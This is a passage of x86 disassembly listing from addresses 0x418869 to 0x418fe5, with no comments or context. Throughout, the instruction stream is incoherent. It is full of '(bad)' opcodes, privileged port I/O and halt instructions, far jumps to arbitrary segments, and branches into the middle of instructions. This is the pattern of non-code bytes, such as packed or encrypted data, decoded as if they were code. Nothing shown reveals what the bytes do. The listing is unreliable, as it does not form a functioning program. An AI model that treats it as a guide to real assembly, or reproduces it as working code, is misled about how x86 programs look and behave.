  418869:	mov    eax,DWORD PTR [edi+0x3cde3497]
  41886f:	adc    al,BYTE PTR [edi]
  418871:	push   esi
  418872:	jle    0x41884a
  418874:	(bad)  [edx-0x19]
  418877:	arpl   WORD PTR [esi+0x734bde7f],si
  41887d:	repnz jecxz 0x4188e6
  418880:	pop    es
  418881:	pop    ss
  418882:	inc    eax
  418883:	shr    BYTE PTR [ecx+0x5b03a63b],1
  418889:	cmp    al,dl
  41888b:	fisub  WORD PTR [esi-0x2a55acd1]
  418891:	jne    0x418881
  418893:	xchg   edx,eax
  418894:	cmp    esp,ecx
  418896:	adc    eax,0xe453eb17
  41889b:	xor    edi,DWORD PTR [ebx]
  41889d:	aad    0xcf
  41889f:	lea    esi,[edi+0x3e212750]
  4188a5:	popf   
  4188a6:	retf   
  4188a7:	loope  0x4188ab
  4188a9:	inc    ebp
  4188aa:	ret    0x9eec
  4188ad:	jmp    0x418837
  4188af:	idiv   esp
  4188b1:	xchg   dh,al
  4188b3:	push   esi
  4188b4:	idiv   BYTE PTR [esi+0x3d]
  4188b7:	icebp  
  4188b8:	into   
  4188b9:	mov    dl,0x8a
  4188bb:	cmc    
  4188bc:	sbb    bl,BYTE PTR [esp+edx*2+0x8d26851]
  4188c3:	in     al,0x8a
  4188c5:	pop    ecx
  4188c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188c7:	iret   
  4188c8:	add    ch,BYTE PTR [ecx]
  4188ca:	jge    0x418873
  4188cc:	das    
  4188cd:	and    al,0x25
  4188cf:	mov    ah,0x5f
  4188d1:	dec    ebp
  4188d2:	xchg   eax,eax
  4188d4:	shr    DWORD PTR [esi+edx*1],0xad
  4188d8:	retf   0x4cb0
  4188db:	test   BYTE PTR [edx-0x72cdca57],0xa3
  4188e2:	push   cs
  4188e3:	xlat   BYTE PTR ds:[ebx]
  4188e4:	outs   dx,DWORD PTR ds:[esi]
  4188e5:	adc    al,bh
  4188e7:	stos   DWORD PTR es:[edi],eax
  4188e8:	inc    eax
  4188e9:	fidiv  DWORD PTR [esi+0x28]
  4188ec:	pop    ss
  4188ed:	cmc    
  4188ee:	xchg   eax,ebp
  4188f0:	gs js  0x418949
  4188f3:	xchg   edi,eax
  4188f4:	xor    esi,DWORD PTR [ebx+ebx*1]
  4188f7:	test   dh,bh
  4188f9:	sbb    cl,cl
  4188fb:	retf   
  4188fc:	js     0x418962
  4188fe:	outs   dx,DWORD PTR ds:[esi]
  4188ff:	mov    esp,0x9850ea40
  418904:	scas   eax,DWORD PTR es:[edi]
  418905:	push   0xffffffe2
  418907:	and    DWORD PTR [edi+ebp*2],ebx
  41890a:	dec    eax
  41890b:	jae    0x4188ae
  41890d:	lds    ecx,FWORD PTR [ecx+ebx*2-0x4d]
  418911:	ins    BYTE PTR es:[edi],dx
  418912:	rcl    dh,1
  418914:	ds push 0x46
  418917:	sub    eax,0xfb050155
  41891c:	mov    BYTE PTR [esi],bh
  41891e:	mov    dl,0x66
  418920:	hlt    
  418921:	dec    ecx
  418922:	int    0xfb
  418924:	push   ebx
  418925:	xchg   BYTE PTR [eax-0x2b],dh
  418928:	jle    0x4188b7
  41892a:	jbe    0x418973
  41892c:	add    BYTE PTR [edx],ah
  41892e:	ja     0x418941
  418930:	(bad)  
  418931:	or     ebp,DWORD PTR ds:[esi]
  418934:	add    ebp,DWORD PTR [edi-0x77f9a0c6]
  41893a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41893b:	push   ebx
  41893c:	dec    ecx
  41893d:	inc    ecx
  41893e:	fcom   DWORD PTR [eax+0x59]
  418941:	push   ds
  418942:	push   0xb9dae5c8
  418947:	xchg   ebx,eax
  418948:	mov    al,ds:0x9f45e348
  41894d:	adc    al,BYTE PTR [esi-0x19a71660]
  418953:	mov    eax,esi
  418955:	sar    BYTE PTR [ecx],1
  418957:	lods   al,BYTE PTR ds:[esi]
  418958:	out    dx,eax
  418959:	test   BYTE PTR [edi+0x28d3f3de],dl
  41895f:	push   ss
  418960:	adc    ebp,DWORD PTR [ecx+eax*8+0x2f94e0bb]
  418967:	cld    
  418968:	(bad)  
  418969:	pop    ecx
  41896a:	in     eax,0x5e
  41896c:	fild   DWORD PTR [ebp+0x23f0c6a1]
  418972:	ds ins DWORD PTR es:[edi],dx
  418974:	mov    ds:0x48ef5048,al
  418979:	sub    al,0x67
  41897b:	xchg   esi,ecx
  41897d:	cmp    eax,DWORD PTR gs:[edx-0x291c12c4]
  418984:	div    BYTE PTR [ecx]
  418986:	push   0x57
  418988:	pop    esp
  418989:	leave  
  41898a:	mov    DWORD PTR [eax],edx
  41898c:	add    ebp,eax
  41898e:	lods   eax,DWORD PTR ds:[esi]
  41898f:	hlt    
  418990:	jne    0x41895a
  418992:	dec    edx
  418993:	leave  
  418994:	mov    cl,BYTE PTR [ecx+0x481a913]
  41899a:	cld    
  41899b:	mov    eax,ds:0x791fc4f9
  4189a0:	xor    edx,DWORD PTR [edi+edx*4]
  4189a3:	xchg   edi,eax
  4189a4:	test   BYTE PTR [esi],bl
  4189a6:	jnp    0x418982
  4189a8:	jmp    0x4189ac
  4189aa:	inc    esp
  4189ab:	and    DWORD PTR ds:0x9be5d688,esi
  4189b1:	call   0xc9630bf1
  4189b6:	arpl   bp,si
  4189b8:	inc    edx
  4189b9:	cdq    
  4189ba:	call   0x191f026d
  4189bf:	adc    bl,BYTE PTR [edx-0x3d]
  4189c2:	mov    esp,0x8a55c75
  4189c7:	mov    ah,0x41
  4189c9:	outs   dx,DWORD PTR ds:[esi]
  4189ca:	xchg   ecx,eax
  4189cb:	dec    ebp
  4189cc:	into   
  4189cd:	push   edx
  4189ce:	push   ebp
  4189cf:	mov    cl,0xf7
  4189d1:	add    DWORD PTR [ebx+0x369d2909],0xffffff95
  4189d8:	seto   BYTE PTR [edx-0x51]
  4189dc:	aas    
  4189dd:	lds    edi,FWORD PTR [edx]
  4189df:	sbb    ebp,DWORD PTR [edi-0x9]
  4189e2:	inc    esi
  4189e3:	mov    ah,0x1c
  4189e5:	adc    bh,BYTE PTR [ecx+ebp*8]
  4189e8:	jnp    0x4189df
  4189ea:	(bad)  
  4189eb:	in     al,dx
  4189ec:	push   edi
  4189ed:	sub    BYTE PTR [ecx+0x3047bb85],dl
  4189f3:	push   es
  4189f4:	xchg   ecx,eax
  4189f5:	mov    edx,0xe35fab11
  4189fa:	or     bh,BYTE PTR [edi+0x69]
  4189fd:	aaa    
  4189fe:	mov    BYTE PTR [eax],0x7b
  418a01:	add    eax,0x2b2f916a
  418a06:	push   eax
  418a07:	adc    BYTE PTR [ebp-0x10],bh
  418a0a:	ds aaa 
  418a0c:	scas   eax,DWORD PTR es:[edi]
  418a0d:	inc    ebp
  418a0e:	fnstcw WORD PTR [ecx]
  418a10:	es sbb ebx,eax
  418a13:	mov    bh,0x9c
  418a15:	scas   al,BYTE PTR es:[edi]
  418a16:	nop
  418a17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a18:	test   BYTE PTR [ebx],al
  418a1a:	mov    edx,0x23ec4138
  418a1f:	jbe    0x4189e5
  418a21:	nop
  418a22:	add    DWORD PTR [ebx-0x24],esi
  418a25:	sbb    dl,ah
  418a27:	outs   dx,BYTE PTR ds:[esi]
  418a28:	xchg   ecx,eax
  418a29:	rcr    DWORD PTR [ebp-0x7a],cl
  418a2c:	fcomp  DWORD PTR [edx-0x4ede136e]
  418a32:	mov    edi,0x65a6e35f
  418a37:	out    dx,eax
  418a38:	or     BYTE PTR [esi],ah
  418a3a:	in     al,0x29
  418a3c:	fisub  DWORD PTR [esp+edi*2+0x5c]
  418a40:	lods   al,BYTE PTR ds:[esi]
  418a41:	scas   eax,DWORD PTR es:[edi]
  418a42:	cli    
  418a43:	and    al,0x56
  418a45:	xchg   edx,eax
  418a46:	aam    0x75
  418a48:	out    dx,al
  418a49:	jno    0x418a3c
  418a4b:	fsub   QWORD PTR [ecx+0x42ea73c5]
  418a51:	jo     0x418a00
  418a53:	xchg   esp,eax
  418a54:	pop    edx
  418a55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a56:	fnstenv [esi+0x468802ef]
  418a5c:	test   BYTE PTR [edi],al
  418a5e:	cmp    eax,0xb8996f30
  418a63:	test   ch,0xb3
  418a66:	in     al,dx
  418a67:	rcr    BYTE PTR [ebx-0x4a],cl
  418a6a:	cld    
  418a6b:	mov    cl,BYTE PTR [esi+0x74]
  418a6e:	pop    ss
  418a6f:	pop    ebp
  418a70:	mov    edi,0x21af7fd8
  418a75:	sub    esp,esp
  418a77:	ja     0x418ac4
  418a79:	ret    0x16c5
  418a7c:	out    dx,eax
  418a7d:	cmp    BYTE PTR [edx+0x19],ch
  418a80:	inc    esp
  418a81:	popf   
  418a82:	cvttps2pi mm5,QWORD PTR [eax]
  418a85:	push   esi
  418a86:	and    al,0xeb
  418a88:	jmp    0xfc48db88
  418a8d:	xlat   BYTE PTR ds:[ebx]
  418a8e:	mov    edi,0x11c894d8
  418a93:	add    esp,DWORD PTR [eax+edi*1]
  418a96:	ret    
  418a97:	and    eax,0xb1f1df9c
  418a9c:	js     0x418a94
  418a9e:	mov    ds:0x8e8651bb,eax
  418aa3:	and    ebp,DWORD PTR [esi-0x5]
  418aa6:	pusha  
  418aa7:	adc    BYTE PTR [ecx+0x6b810ebb],al
  418aad:	test   BYTE PTR [ebx],bl
  418aaf:	sbb    edx,DWORD PTR [esi-0xc056e23]
  418ab5:	jmp    0x418a5c
  418ab7:	jmp    0x4ea917a6
  418abc:	jb     0x418aa9
  418abe:	scas   al,BYTE PTR es:[edi]
  418abf:	jg     0x418adf
  418ac1:	fsub   QWORD PTR [ebp-0x4e242212]
  418ac7:	call   0x5d2e8bc3
  418acc:	inc    edx
  418acd:	or     bh,BYTE PTR [esi+eax*2]
  418ad0:	and    eax,DWORD PTR [esi+0x54]
  418ad3:	std    
  418ad4:	fsubr  DWORD PTR [ecx]
  418ad6:	out    0x9d,al
  418ad8:	mov    eax,eax
  418ada:	shl    DWORD PTR [ebx+esi*1+0xdca3121],0x79
  418ae2:	scas   al,BYTE PTR es:[edi]
  418ae3:	sbb    BYTE PTR [ecx+0x5720a219],dl
  418ae9:	enter  0xa088,0x60
  418aed:	leave  
  418aee:	xchg   esi,eax
  418aef:	cmp    DWORD PTR [edx],eax
  418af1:	pop    ecx
  418af2:	push   edi
  418af3:	mov    esp,0x144c1f1
  418af8:	fadd   DWORD PTR [ebp+0x55]
  418afb:	xchg   dh,ah
  418afd:	mov    al,0x4e
  418aff:	idiv   bh
  418b01:	mov    bh,0xc8
  418b03:	jnp    0x418aa0
  418b05:	push   0x56934ef9
  418b0a:	pop    edi
  418b0b:	push   0x69
  418b0d:	jp     0x418b56
  418b0f:	or     BYTE PTR [ebx-0x56],dh
  418b12:	sub    DWORD PTR [edx-0xe49c5e4],ebp
  418b18:	cli    
  418b19:	(bad)  
  418b1a:	mov    eax,0x24b1b229
  418b1f:	in     eax,0x71
  418b21:	stc    
  418b22:	repz fsubr st(1),st
  418b25:	xor    al,0xa1
  418b27:	fdiv   QWORD PTR [ebp-0x5672308]
  418b2d:	or     al,0x48
  418b2f:	int3   
  418b30:	add    al,BYTE PTR [eax]
  418b32:	sbb    al,0x4c
  418b34:	rol    BYTE PTR [ebp+ebp*4+0x35a2529],0x20
  418b3c:	sbb    DWORD PTR [eax+0x29c43de0],ebx
  418b42:	std    
  418b43:	mov    esp,0xb6a88a45
  418b48:	in     eax,dx
  418b49:	pusha  
  418b4a:	push   es
  418b4b:	ja     0x418ad2
  418b4d:	pop    es
  418b4e:	pop    ebx
  418b4f:	into   
  418b50:	imul   edx,ecx,0xfffffffd
  418b53:	dec    edi
  418b54:	jecxz  0x418b91
  418b56:	stc    
  418b57:	xor    al,0x3b
  418b59:	into   
  418b5a:	adc    DWORD PTR [eax-0x63],ebp
  418b5d:	cs ins BYTE PTR es:[edi],dx
  418b5f:	push   eax
  418b60:	fwait
  418b61:	mov    es,WORD PTR [eax-0x447ca24b]
  418b67:	enter  0xc31a,0xe5
  418b6b:	not    dl
  418b6d:	mov    ah,0xbd
  418b6f:	push   edx
  418b70:	pop    esi
  418b71:	nop
  418b72:	sbb    ebx,edi
  418b74:	mov    gs,WORD PTR [edx+0x60da4caa]
  418b7a:	pop    es
  418b7b:	frstor [edx+0x4df1b764]
  418b81:	ins    DWORD PTR es:[edi],dx
  418b82:	(bad)  
  418b83:	sbb    ecx,DWORD PTR [ebp-0x74]
  418b86:	hlt    
  418b87:	(bad)  
  418b88:	ins    DWORD PTR es:[edi],dx
  418b89:	daa    
  418b8a:	jmp    0xcd90:0x1dc7823d
  418b91:	ins    DWORD PTR es:[edi],dx
  418b92:	adc    bl,ah
  418b94:	jmp    0x418c0a
  418b96:	je     0x418b1b
  418b98:	or     ah,BYTE PTR [esi+ecx*2]
  418b9b:	test   esi,esp
  418b9d:	jg     0x418c09
  418b9f:	xchg   edi,eax
  418ba0:	js     0x418beb
  418ba2:	std    
  418ba3:	loop   0x418beb
  418ba5:	inc    ebx
  418ba6:	jmp    0xc2508b4e
  418bab:	fidivr DWORD PTR [ebx*4-0x73b3cbf5]
  418bb2:	mov    eax,0x863ff310
  418bb7:	scas   eax,DWORD PTR es:[edi]
  418bb8:	push   ecx
  418bb9:	sbb    al,0x6
  418bbb:	hlt    
  418bbc:	mov    ebx,0x72d42db7
  418bc1:	shl    BYTE PTR [edi+0x1d6d2750],1
  418bc7:	inc    ebx
  418bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bc9:	inc    al
  418bcb:	cmp    BYTE PTR ds:0x2f34e9c3,bh
  418bd1:	sub    ch,BYTE PTR [ecx]
  418bd3:	add    al,0x79
  418bd5:	fs mov bh,0x2e
  418bd8:	enter  0x7ca0,0xf4
  418bdc:	mov    dl,0x40
  418bde:	stc    
  418bdf:	add    DWORD PTR [edx+esi*8+0x27f11bcb],0x9c7e5026
  418bea:	bound  ebx,QWORD PTR [esi-0x6e0c4228]
  418bf0:	aad    0x7d
  418bf2:	les    ecx,FWORD PTR [edi+0x709e833e]
  418bf8:	stos   DWORD PTR es:[edi],eax
  418bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bfa:	sbb    ah,BYTE PTR [esi+0xd2b8477]
  418c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c01:	shl    BYTE PTR [eax],cl
  418c03:	leave  
  418c04:	call   0x26517e45
  418c09:	in     al,0x66
  418c0b:	cs jno 0x418c11
  418c0e:	xchg   edi,eax
  418c0f:	jmp    0x418c76
  418c11:	stos   BYTE PTR es:[edi],al
  418c12:	fs push ss
  418c14:	or     ecx,ebp
  418c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c17:	loop   0x418c47
  418c19:	sbb    al,0xff
  418c1b:	jp     0x418bf1
  418c1d:	jmp    0x2baf:0x884671dc
  418c24:	pop    esp
  418c25:	pmullw mm5,QWORD PTR [eax+0x3d]
  418c29:	mov    eax,ds:0x6c11976c
  418c2e:	push   0xb1c19f11
  418c33:	push   ss
  418c34:	or     al,0x55
  418c36:	pusha  
  418c37:	stos   DWORD PTR es:[edi],eax
  418c38:	(bad)  
  418c39:	sub    DWORD PTR [ebp+0x30],ebx
  418c3c:	sub    al,0xaa
  418c3e:	into   
  418c3f:	bound  esp,QWORD PTR [eax+0x6aa3186f]
  418c45:	loop   0x418c86
  418c47:	stc    
  418c48:	mov    edx,0x934f71b8
  418c4d:	mov    bh,0xe
  418c4f:	jne    0x418c4a
  418c51:	fsub   st(2),st
  418c53:	dec    edi
  418c54:	popf   
  418c55:	std    
  418c56:	push   cs
  418c57:	(bad)  
  418c58:	aaa    
  418c59:	inc    ecx
  418c5a:	inc    ecx
  418c5b:	sub    DWORD PTR [edi],ebp
  418c5d:	pavgb  mm1,QWORD PTR [edx-0x7a]
  418c61:	push   edi
  418c62:	dec    ebx
  418c63:	adc    cl,cl
  418c65:	push   edi
  418c66:	mov    ds:0xacf74cb1,al
  418c6b:	adc    ch,BYTE PTR [esi-0x7b]
  418c6e:	dec    edx
  418c6f:	popa   
  418c70:	sbb    edx,esi
  418c72:	push   esp
  418c73:	push   0xd1496c9d
  418c78:	pusha  
  418c79:	pop    ecx
  418c7a:	and    eax,0x671e88e3
  418c7f:	fnsave [esi-0x6325cd47]
  418c85:	inc    edi
  418c86:	in     eax,dx
  418c87:	sub    dh,dl
  418c89:	add    DWORD PTR [esi-0x446acd25],ebx
  418c8f:	fisub  DWORD PTR [ecx+0x93e1cf9]
  418c95:	enter  0x885,0x4
  418c99:	cs aad 0x82
  418c9c:	push   edi
  418c9d:	or     al,0x55
  418c9f:	(bad)  
  418ca0:	xchg   ecx,eax
  418ca1:	into   
  418ca2:	out    dx,al
  418ca3:	cmp    BYTE PTR [eax+edx*8-0x19e1b3af],bl
  418caa:	aaa    
  418cab:	sbb    ebx,DWORD PTR [eax+0x111868ac]
  418cb1:	ja     0x418c4e
  418cb3:	or     esi,ebp
  418cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cb6:	maxps  xmm5,xmm2
  418cb9:	pusha  
  418cba:	xchg   ebx,eax
  418cbb:	sbb    eax,0x871746
  418cc0:	inc    edx
  418cc1:	or     BYTE PTR ds:0x2053f081,dh
  418cc7:	das    
  418cc8:	cmp    al,0x4
  418cca:	pushf  
  418ccb:	stos   BYTE PTR es:[edi],al
  418ccc:	cwde   
  418ccd:	lods   al,BYTE PTR ds:[esi]
  418cce:	push   0x4a
  418cd0:	int3   
  418cd1:	jmp    0x30:0x76af8c38
  418cd8:	in     eax,dx
  418cd9:	cmp    esi,edx
  418cdb:	out    dx,eax
  418cdc:	adc    ch,bl
  418cde:	pop    ebx
  418cdf:	push   es
  418ce0:	int    0x88
  418ce2:	mov    ah,0x52
  418ce4:	out    dx,al
  418ce5:	adc    al,0xef
  418ce7:	ficomp DWORD PTR [esi]
  418ce9:	popf   
  418cea:	sub    eax,0x5f7f5a5
  418cef:	sbb    al,0x93
  418cf1:	adc    dl,BYTE PTR [ebp+0x1]
  418cf4:	out    dx,al
  418cf5:	mov    ecx,0xed573cf4
  418cfa:	push   edx
  418cfb:	jns    0x418cd2
  418cfd:	bswap  edx
  418cff:	mov    ecx,0x23a10601
  418d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d05:	lea    ebp,[edi+0x53]
  418d08:	and    DWORD PTR [edx+edi*8],0x828eb53
  418d0f:	enter  0x3986,0xe3
  418d13:	inc    ebx
  418d14:	cdq    
  418d15:	or     BYTE PTR [edi],cl
  418d17:	fimul  DWORD PTR [esi+0x71]
  418d1a:	sbb    BYTE PTR [ebp-0x10],cl
  418d1d:	(bad)  
  418d1e:	(bad)  
  418d20:	pusha  
  418d21:	sub    esi,DWORD PTR [esi+edx*1]
  418d24:	push   eax
  418d25:	shl    DWORD PTR [ebp-0x8f1b6c1],0x4d
  418d2c:	imul   ebx,ecx,0xffffff9b
  418d2f:	and    eax,0xafc9f5b2
  418d34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d35:	mov    edi,0x171b922d
  418d3a:	xchg   edi,eax
  418d3b:	mov    edi,0xd69f2585
  418d40:	data16 or BYTE PTR [edx-0x9],bh
  418d44:	mov    ebp,ecx
  418d46:	call   0x9a09a694
  418d4b:	mov    ebx,0x1913c109
  418d50:	cmp    DWORD PTR [ebx-0x982162a],edi
  418d56:	jae    0x418ce6
  418d58:	leave  
  418d59:	imul   eax,DWORD PTR [eax],0x6b227a99
  418d5f:	mov    esi,0xf4324987
  418d64:	push   eax
  418d65:	loopne 0x418dc7
  418d67:	ds fisub DWORD PTR ss:[edi-0x446abda7]
  418d6f:	test   BYTE PTR [ecx+0x59],0x2
  418d73:	mov    BYTE PTR [ecx-0x7d44381f],dh
  418d79:	add    ah,BYTE PTR [edi+edi*2]
  418d7c:	adc    DWORD PTR [ebx],ebp
  418d7e:	aam    0x64
  418d80:	push   0x66aaa1ce
  418d85:	shr    BYTE PTR [eax-0x2c],1
  418d88:	fsubr  DWORD PTR ds:0x45766927
  418d8e:	fsubr  QWORD PTR [esp+eiz*2]
  418d91:	not    DWORD PTR [ecx-0x6f78579c]
  418d97:	jae    0x418dcf
  418d99:	sar    dh,1
  418d9b:	jl     0x418d79
  418d9d:	pop    esp
  418d9e:	pop    es
  418d9f:	popa   
  418da0:	sti    
  418da1:	or     al,0x76
  418da3:	pop    ds
  418da4:	sbb    eax,0x1174902d
  418da9:	mov    dh,0x6f
  418dab:	mov    esi,0xdf461400
  418db0:	nop
  418db1:	loop   0x418d49
  418db3:	adc    dh,BYTE PTR [edx+0x5e]
  418db6:	or     ah,BYTE PTR [eax+0x68f193e1]
  418dbc:	xor    esi,DWORD PTR ds:0x51c156c7
  418dc2:	pop    esp
  418dc3:	push   ds
  418dc4:	mov    ch,0x86
  418dc6:	sub    ch,BYTE PTR [edi+0x6223c25c]
  418dcc:	jns    0x418d8e
  418dce:	fcom   QWORD PTR [ebx-0x405946e0]
  418dd4:	mov    BYTE PTR [esi],bl
  418dd6:	dec    ebx
  418dd7:	jl     0x418db3
  418dd9:	push   ebx
  418dda:	add    eax,0x20b058d8
  418ddf:	add    BYTE PTR [edx-0x80],dl
  418de2:	(bad)  [ebx-0x3b0ab001]
  418de8:	xchg   BYTE PTR [eax+0x14dd2379],al
  418dee:	out    dx,al
  418def:	neg    DWORD PTR [eax]
  418df1:	out    dx,al
  418df2:	pop    es
  418df3:	push   ebx
  418df4:	cmp    dh,BYTE PTR [ecx]
  418df6:	rcr    BYTE PTR [edx],1
  418df8:	xchg   ebp,ecx
  418dfa:	arpl   WORD PTR [ecx-0x30],sp
  418dfd:	sub    al,0xd7
  418dff:	xchg   edi,eax
  418e00:	popf   
  418e01:	xchg   BYTE PTR [edi+0x6a1e0eb],cl
  418e07:	lods   eax,DWORD PTR ds:[esi]
  418e08:	add    eax,0xce5799ab
  418e0d:	dec    ebx
  418e0e:	sti    
  418e0f:	lock test al,0xa0
  418e12:	stos   DWORD PTR es:[edi],eax
  418e13:	sbb    al,0xd0
  418e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e17:	mov    esp,0x57b90512
  418e1c:	(bad)  
  418e1d:	lahf   
  418e1e:	ret    0xe6a
  418e21:	test   BYTE PTR [edi-0x1d],0x40
  418e25:	and    BYTE PTR [edi+0x1f46681d],bh
  418e2b:	clc    
  418e2c:	pusha  
  418e2d:	sti    
  418e2e:	(bad)  
  418e2f:	add    BYTE PTR [ebx+0x50],al
  418e32:	mov    WORD PTR [ebx-0x7160b01a],fs
  418e38:	adc    DWORD PTR [ebp+eax*2-0x580fd8f8],edi
  418e3f:	jnp    0x418e94
  418e41:	fstp   st(3)
  418e43:	js     0x418e97
  418e45:	mov    bh,0x45
  418e47:	sub    bh,BYTE PTR [ebp+0x51]
  418e4a:	and    DWORD PTR [eax+ecx*2+0x7bd61de1],esp
  418e51:	push   0x70
  418e53:	sbb    DWORD PTR [esi],0x55
  418e56:	jp     0x418e92
  418e58:	inc    ecx
  418e59:	push   ds
  418e5a:	pop    ecx
  418e5b:	cs pop es
  418e5d:	jnp    0x418e25
  418e5f:	xchg   DWORD PTR gs:[eax+0x49575206],ebp
  418e66:	call   0x750c:0xa9edb0c0
  418e6d:	adc    dh,BYTE PTR [ecx]
  418e6f:	ss mov cl,0xe6
  418e72:	push   ebp
  418e73:	or     eax,0x85084769
  418e78:	sub    al,0x4
  418e7a:	data16 ins BYTE PTR es:[edi],dx
  418e7c:	xor    eax,0xf2439bd3
  418e81:	sub    BYTE PTR [esi+ebx*4],bl
  418e84:	or     bh,BYTE PTR [ebp+0x11]
  418e87:	adc    al,0xe6
  418e89:	xchg   edx,eax
  418e8a:	lock xor BYTE PTR ds:0x5c2f7cc8,al
  418e91:	shl    dh,1
  418e93:	test   DWORD PTR [esi+0x43],eax
  418e96:	out    dx,eax
  418e97:	cmp    al,0x41
  418e99:	dec    edx
  418e9a:	inc    ebp
  418e9b:	jb     0x418e7b
  418e9d:	pop    ss
  418e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e9f:	sub    al,0x24
  418ea1:	push   ebp
  418ea2:	add    dl,BYTE PTR [esi]
  418ea4:	call   0xdea2ef1d
  418ea9:	jecxz  0x418eaa
  418eab:	push   ebx
  418eac:	lahf   
  418ead:	push   edi
  418eae:	jp     0x418ee5
  418eb0:	pushf  
  418eb1:	cmp    al,0x5a
  418eb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eb4:	mov    ah,0xd2
  418eb6:	sbb    DWORD PTR [edx+0x6f],ecx
  418eb9:	call   edx
  418ebb:	std    
  418ebc:	aam    0x27
  418ebe:	sar    DWORD PTR [edx+ebp*4-0x2292f96d],cl
  418ec5:	bound  edi,QWORD PTR [ebp+0x1ef8b7cb]
  418ecb:	mov    ecx,0x9b82ab0c
  418ed0:	sbb    BYTE PTR [esi-0x627f8a03],bl
  418ed6:	push   ds
  418ed7:	dec    ecx
  418ed8:	push   edi
  418ed9:	ror    DWORD PTR [eax],1
  418edb:	popa   
  418edc:	ret    
  418edd:	push   esp
  418ede:	pop    esi
  418edf:	xor    eax,0xff21584b
  418ee4:	xchg   ecx,eax
  418ee5:	arpl   si,sp
  418ee7:	pop    edi
  418ee8:	and    ah,ch
  418eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418eeb:	aam    0x66
  418eed:	clc    
  418eee:	xchg   BYTE PTR [edi],dl
  418ef0:	mov    al,ds:0x9c718ebe
  418ef5:	adc    eax,edx
  418ef7:	push   edx
  418ef8:	mov    bl,0xd0
  418efa:	retf   
  418efb:	jl     0x418f5b
  418efd:	sub    eax,0xfa4115d8
  418f02:	cmp    eax,0x393ecb74
  418f07:	pop    esp
  418f08:	xchg   esp,eax
  418f09:	pop    edx
  418f0a:	dec    ecx
  418f0b:	xchg   edx,eax
  418f0c:	add    DWORD PTR [edx],edi
  418f0e:	lds    ebx,FWORD PTR [ebx+0x60]
  418f11:	scas   eax,DWORD PTR es:[edi]
  418f12:	and    eax,0xb3f2e134
  418f17:	pcmpgtd mm4,mm3
  418f1a:	(bad)  
  418f1b:	hlt    
  418f1c:	jmp    0x418ebb
  418f1e:	xor    ebx,ecx
  418f20:	jge    0x418ed3
  418f22:	(bad)  
  418f23:	icebp  
  418f24:	aaa    
  418f25:	adc    bx,cx
  418f28:	push   cs
  418f29:	mov    edx,0x8e3b44fc
  418f2e:	jae    0x418ebb
  418f30:	ja     0x418ede
  418f32:	mov    ds:0x4e595c05,al
  418f37:	pop    ds
  418f38:	pop    ebp
  418f39:	add    BYTE PTR [eax+0x4e],dl
  418f3c:	call   0x5b49:0xdeee1a8f
  418f43:	xor    BYTE PTR [ebx],0x92
  418f46:	mov    dl,0x9c
  418f48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f49:	int3   
  418f4a:	aam    0xba
  418f4c:	stos   BYTE PTR es:[edi],al
  418f4d:	adc    al,0x1b
  418f4f:	fisub  WORD PTR [ebx-0x23]
  418f52:	xor    DWORD PTR [ecx-0x65],ecx
  418f55:	rol    dl,1
  418f57:	mov    bl,0x30
  418f59:	push   eax
  418f5a:	(bad)  
  418f5b:	mov    ah,0x43
  418f5d:	sub    ch,BYTE PTR [edx+0x35]
  418f60:	or     ch,bl
  418f62:	jg     0x418f69
  418f64:	cdq    
  418f65:	sub    edx,DWORD PTR [edx+0x32]
  418f68:	mov    dl,0xb8
  418f6a:	adc    al,0xbe
  418f6c:	push   ecx
  418f6d:	mov    ebp,0xf3406ad1
  418f72:	xor    esp,DWORD PTR [ecx+0x78]
  418f75:	mov    ah,0xdd
  418f77:	jecxz  0x418fae
  418f79:	push   esi
  418f7a:	out    dx,eax
  418f7b:	mov    bl,0x88
  418f7d:	sbb    eax,0xa3d13898
  418f82:	outs   dx,BYTE PTR ds:[esi]
  418f83:	stc    
  418f84:	mov    ch,0xf6
  418f86:	test   al,0x14
  418f88:	je     0x418fc2
  418f8a:	pop    ebp
  418f8b:	or     esp,DWORD PTR [edi+0x7fa62f73]
  418f91:	pusha  
  418f92:	jb     0x418ff2
  418f94:	push   es
  418f95:	xlat   BYTE PTR ds:[ebx]
  418f96:	loope  0x418fc5
  418f98:	call   0x818a:0x943b5296
  418f9f:	aas    
  418fa0:	adc    ch,ch
  418fa2:	and    al,0x74
  418fa4:	xchg   esp,eax
  418fa5:	push   esp
  418fa6:	stos   DWORD PTR es:[edi],eax
  418fa7:	pop    ebx
  418fa8:	fist   WORD PTR [edx]
  418faa:	clc    
  418fab:	sub    BYTE PTR [eax+0x57e4b4ad],0x46
  418fb2:	mov    bl,0x1d
  418fb4:	inc    ebx
  418fb5:	idiv   DWORD PTR [esi+0x6a]
  418fb8:	jp     0x418fb6
  418fba:	fs jl  0x418f80
  418fbd:	or     dh,BYTE PTR [esi+0x58]
  418fc0:	push   0xffffff97
  418fc2:	gs pusha 
  418fc4:	and    DWORD PTR [eax],ebx
  418fc6:	shr    edx,1
  418fc8:	mov    ah,0x1c
  418fca:	mov    ds:0x33ab0bcf,eax
  418fcf:	mov    dl,0x3f
  418fd1:	int    0x5e
  418fd3:	xor    BYTE PTR [edi],dl
  418fd5:	mov    al,0x1d
  418fd7:	pop    ebp
  418fd8:	mov    ds:0xea138647,eax
  418fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fde:	cmp    ebx,edx
  418fe0:	mov    ebp,0x8f7ac8f2
  418fe5:	out    dx,eax
